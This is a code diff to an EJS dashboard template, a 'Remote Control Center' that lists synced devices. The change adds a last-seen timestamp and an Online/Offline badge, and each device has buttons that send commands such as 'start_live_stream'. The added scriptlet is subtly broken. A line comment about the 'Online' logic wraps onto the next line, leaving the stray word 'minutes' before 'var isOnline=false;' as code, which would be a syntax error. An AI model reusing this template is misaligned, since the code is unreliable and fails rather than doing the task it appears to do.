@@ -166,22 +166,39 @@
                 Remote Control Center
             </h2>
             <div id="device-controls" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                <% var deviceIds=Object.keys(data.devices || {}); %>
+                <% var deviceIds=Object.keys(data.devices || {}); var devicesInfo=data.devices_info || {}; %>
                     <% if(deviceIds.length===0) { %>
                         <p class="text-slate-500 text-xs italic">Waiting for devices to sync User-ID... (Try taking a
                             photo or sending a log from the app)</p>
                         <% } %>
-                            <% deviceIds.forEach(function(deviceId){ %>
-                                <div class="bg-white/5 border border-white/10 rounded-xl p-4">
+                            <% deviceIds.forEach(function(deviceId){ var info=devicesInfo[deviceId] || {}; var
+                                lastSeen=info.lastSeen || 'Unknown' ; // Simple "Online" logic: if pinged in last 2
+                                minutes var isOnline=false; try { var now=new Date(); var seen=new Date(lastSeen); if
+                                ((now - seen) < 120000) isOnline=true; } catch(e) {} %>
+                                <div
+                                    class="bg-white/5 border border-white/10 rounded-xl p-4 transition-all hover:bg-white/10">
                                     <div class="flex justify-between items-start mb-3">
                                         <div>
                                             <p class="text-[0.65rem] text-slate-500 uppercase font-bold">Device ID</p>
                                             <p class="text-xs font-mono text-violet-300">
                                                 <%= deviceId %>
                                             </p>
+                                            <p class="text-[0.6rem] text-slate-400 mt-1">Last Seen: <span
+                                                    class="text-slate-200">
+                                                    <%= lastSeen %>
+                                                </span></p>
                                         </div>
-                                        <span
-                                            class="badge bg-green-900/40 text-green-400 border border-green-500/20">Online</span>
+                                        <% if(isOnline) { %>
+                                            <span
+                                                class="badge bg-emerald-900/40 text-emerald-400 border border-emerald-500/20 flex items-center">
+                                                <span
+                                                    class="w-1.5 h-1.5 rounded-full bg-emerald-500 mr-1.5 animate-pulse"></span>
+                                                Online
+                                            </span>
+                                            <% } else { %>
+                                                <span
+                                                    class="badge bg-slate-800 text-slate-400 border border-slate-700">Offline</span>
+                                                <% } %>
                                     </div>
                                     <div class="grid grid-cols-2 gap-2">
                                         <button onclick="sendCommand('<%= deviceId %>', 'start_live_stream')"
